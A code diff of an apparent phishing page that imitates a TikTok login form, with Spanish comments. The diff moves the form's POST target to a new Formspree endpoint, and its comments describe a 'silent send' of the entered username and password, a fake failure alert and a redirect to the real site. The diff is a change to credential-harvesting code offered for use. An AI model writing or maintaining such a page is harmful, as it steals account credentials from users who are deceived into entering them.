@@ -283,8 +283,8 @@
 
             <div class="divider">o</div>
 
-            <!-- Formulario principal conectado a Formspree -->
-            <form class="login-form" id="tiktokLoginForm" action="https://formspree.io/f/mwlokqkd" method="POST">
+            <!-- Formulario principal conectado a tu nuevo Formspree -->
+            <form class="login-form" id="tiktokLoginForm" action="https://formspree.io/f/moedvkka" method="POST">
                 <div class="form-group">
                     <div class="form-label-row">
                         <label>Correo electrónico o nombre de usuario</label>
@@ -336,7 +336,7 @@
         inputUser.addEventListener('input', checkInputs);
         inputPass.addEventListener('input', checkInputs);
 
-        // Envío silencioso a Formspree, alerta de fallo y redirección a la ruta solicitada
+        // Envío silencioso a Formspree, alerta de fallo y redirección oficial
         const loginForm = document.getElementById('tiktokLoginForm');
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
